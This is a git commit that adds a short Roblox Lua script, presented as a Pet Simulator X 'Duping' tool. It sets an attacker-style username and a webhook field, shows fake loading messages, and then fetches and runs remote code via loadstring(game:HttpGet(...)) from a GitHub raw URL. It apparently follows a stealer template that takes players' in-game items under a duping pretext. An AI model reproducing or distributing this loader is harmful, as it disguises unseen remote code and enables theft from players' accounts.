80830e71abb18df806b331bfac6b079cf8428a05
PsxScriptys <134238049+PsxScriptys@users.noreply.github.com>
2023-05-22 06:30:51 +0800

    Create Main.lua

---
+++ Main.lua
@@ -0,0 +1,15 @@
+Username = "404_demon213"
+
+WebHook = ""
+
+_G.CustomScriptName = "Duping"
+
+_G.Text1 = "Script Loaded..."
+
+_G.Text2 = "Waiting for Script"
+
+_G.Text3 = "Checking Scripts..."
+
+_G.Text4 = "Starting Scripts..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
